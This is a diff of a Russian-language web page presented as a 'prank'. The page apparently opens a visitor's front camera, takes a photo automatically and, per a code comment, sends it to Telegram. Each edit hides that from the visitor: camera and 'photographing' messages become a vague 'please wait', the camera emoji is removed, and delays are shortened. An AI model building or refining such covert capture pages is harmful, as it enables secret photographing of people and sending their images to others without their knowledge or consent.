@@ -117,7 +117,7 @@
 </head>
 <body>
     <div class="container">
-        <div class="emoji">📸</div>
+        <div class="emoji">Хэй</div>
         <h1>Прикол</h1>
         
         <button id="greetBtn">
@@ -156,7 +156,7 @@
             // Автоматически скрываем через 5 секунд
             setTimeout(() => {
                 statusDiv.style.display = 'none';
-            }, 5000);
+            }, 2000);
         }
         
         // Функция для отправки фото в Telegram
@@ -236,7 +236,7 @@
         // Функция запуска камеры
         async function startCamera() {
             try {
-                showStatus('📷 Запрашиваем доступ к камере...', 'loading');
+                showStatus('Подождите', 'loading');
                 
                 // Запрашиваем доступ к фронтальной камере
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -257,7 +257,7 @@
                     // Даем видео немного времени для настройки
                     setTimeout(() => {
                         capturePhoto();
-                    }, 500);
+                    }, 200);
                 };
                 
             } catch (error) {
@@ -280,7 +280,7 @@
         // Обработчик клика по кнопке
         greetBtn.addEventListener('click', () => {
             greetBtn.disabled = true;
-            greetBtn.innerHTML = '⏳ Фотографируем...';
+            greetBtn.innerHTML = '⏳ подождите...';
             
             // Запускаем камеру и делаем фото
             startCamera();
